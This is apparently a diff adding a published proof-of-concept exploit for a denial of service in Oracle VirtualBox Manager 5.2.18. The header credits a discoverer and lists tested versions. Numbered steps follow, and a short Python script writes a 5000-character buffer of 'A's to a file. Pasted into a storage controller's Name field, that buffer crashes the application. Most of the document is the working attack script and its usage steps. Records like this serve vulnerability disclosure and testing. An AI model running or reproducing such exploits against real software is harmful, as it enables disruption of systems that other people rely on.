@@ -1,0 +1,28 @@
+# Exploit Title: Oracle VirtualBox Manager 5.2.18 r124319  - 'Name Attribute' Denial of Service (PoC)
+# Discovery by: Jose Eduardo Castro
+# Discovery Date: 2018-09-14
+# Vendor Homepage: https://www.virtualbox.org/
+# Software Link: https://download.virtualbox.org/virtualbox/5.2.18/VirtualBox-5.2.18-124319-Win.exe
+# Tested Version: 5.2.18 r124319
+# Tested on OS  : Windows 7 Ultimate x64 es
+ 
+#!/usr/bin/env python
+#-*-coding: utf-8-*-
+# Steps to Produce the DoS: 
+# 1.- Run python code : python vb_dos.py
+# 2.- Open string.txt and copy content to clipboard
+# 3.- Open VM VirtualBox Manager
+# 4.- Select a created virtual machine in mode "power off" and select "Settings"
+# 5.- Select "Storage" button
+# 6.- Select option "Adds new storage controller" and select any controller
+# 7.- Paste ClipBoard on "Name"
+# 8.- Clic OK
+# 9.- DoS
+ 
+import socket, os, sys
+ 
+buffer = "\x41" * 5000
+ 
+f = open ("string.txt", "w")
+f.write(buffer)
+f.close()
